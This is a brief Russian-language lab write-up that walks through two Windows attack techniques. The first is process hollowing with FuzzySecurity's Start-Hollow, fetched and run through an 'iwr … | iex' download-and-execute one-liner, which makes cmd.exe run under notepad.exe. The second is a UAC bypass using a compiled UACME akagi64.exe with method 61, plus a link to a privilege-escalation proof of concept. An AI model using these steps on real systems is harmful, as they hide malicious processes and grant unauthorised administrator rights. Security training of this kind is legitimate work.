
Задача 1:  
1. Требуется запустить PS с правами админа  
2. Устанавливаем Start-Hollow

(iwr –uri [https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Start-Hollow.ps1](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Start-Hollow.ps1) -UseBasicParsing).Content | iex

3. Запускаем Start-Hollow. В поле Sponsor пишем файл с помощью которого запустим другое файл (например: notepad.exe), в поле Hollow пишем имя приложение которое нам нужно запустить (например: cmd.exe)

4. Получаем cmd запущенный в блокноте


Задача 2:

1.      Устанавливаем на основную машину архив [https://github.com/hfiref0x/UACME](https://github.com/hfiref0x/UACME)

2.      Запускаем С:\UACME-3.6.6\UACME-3.6.6\Source\uacme.sln в Visual Code

3.      Устанавливаем параметры Release x64 и запускаем компиляцию

4.      Затем компилируется файл akagi64.exe, который требуется переместить на windows машину

5.      После запускаем через консоль akagi64.exe 61(ключ для akagi. Производит манипуляции с разделами \system32\slui.exe и  \system32\changepk.exe) и получаем консоль админа (подробнее с ключами для запуска можно ознакомиться на гитхабе). POC для ознакомления с работой данного ключа [slui.exe (ChangePK) Privilege escalation POC](https://gist.github.com/r00t-3xp10it/0c92cd554d3156fd74f6c25660ccc466)

 